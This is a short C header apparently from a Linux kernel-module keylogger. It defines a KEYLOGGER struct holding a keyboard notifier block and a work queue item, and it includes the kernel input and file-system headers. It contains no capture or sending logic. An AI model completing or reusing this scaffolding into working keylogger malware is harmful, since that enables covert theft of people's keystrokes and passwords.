#ifndef STRUCT_KEYLOGGER_H
#define STRUCT_KEYLOGGER_H
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/input.h>
#include <linux/keyboard.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/workqueue.h>

    typedef struct KEYLOGGER
    {
        struct notifier_block key_notifier;
        struct work_struct work_struct;
    }KEYLOGGER;
#endif